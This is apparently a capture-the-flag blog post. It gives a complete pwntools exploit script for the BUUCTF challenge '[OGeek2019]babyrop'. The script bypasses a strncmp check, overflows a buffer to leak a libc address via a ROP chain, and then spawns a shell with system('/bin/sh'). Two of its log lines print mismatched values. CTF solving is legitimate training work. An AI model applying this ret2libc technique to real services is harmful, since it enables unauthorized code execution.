---
title: "BUUCTF Pwn [OGeek2019]babyrop"
date: 2020-02-08T20:19:30+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# [OGeek2019]babyrop

```python
#!/usr/bin/env python
#-*-coding=UTF-8-*-

from pwn import *

sh = remote('node3.buuoj.cn',25393)
#sh = process('./ogeek2019_babyrop')
#context(log_level='debug')

elf = ELF('./ogeek2019_babyrop')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x08048825

log.success('write_plt => {}'.format(hex(write_plt)))
log.success('write_got => {}'.format(hex(write_got)))

libc = ELF('./libc-2.23.so')
libc_system_addr = libc.symbols['system']
libc_binsh_addr = next(libc.search('/bin/sh'))
libc_write_addr = libc.symbols['write']

log.success('libc_system_addr => {}'.format(hex(libc_system_addr)))
log.success('libc_binsh_addr => {}'.format(hex(libc_binsh_addr)))
log.success('libc_write_addr => {}'.format(hex(libc_write_addr)))

bypass_payload = '\x00' + 'a'*6 #bypass strncmp() 
bypass_payload += '\xff' #a1='\xff',char'\xff'=255(ascii),read(0,&buf,a1(255)) 
sh.sendline(bypass_payload)

offset2ebp = 0xe7
leak_payload = 'a'*offset2ebp + 'aaaa'
leak_payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
#write(1,&write_got,4);retn2main;
sh.sendlineafter('Correct\n',leak_payload)

leak_write_addr = u32(sh.recv()[0:4])
log.success('leak_write_addr => {}'.format(hex(leak_write_addr)))

libc_baseaddr = leak_write_addr - libc_write_addr
system_addr = libc_system_addr + libc_baseaddr
binsh_addr = libc_binsh_addr + libc_baseaddr

log.success('libc_baseaddr => {}'.format(hex(libc_baseaddr)))
log.success('system_addr => {}'.format(hex(libc_binsh_addr)))
log.success('binsh_addr => {}'.format(hex(libc_write_addr)))

sh.sendline(bypass_payload)
payload = 'a'*offset2ebp + 'bbbb'
payload += p32(system_addr) + 'retn' + p32(binsh_addr)
sh.sendlineafter('Correct\n',payload)
sh.interactive()

```

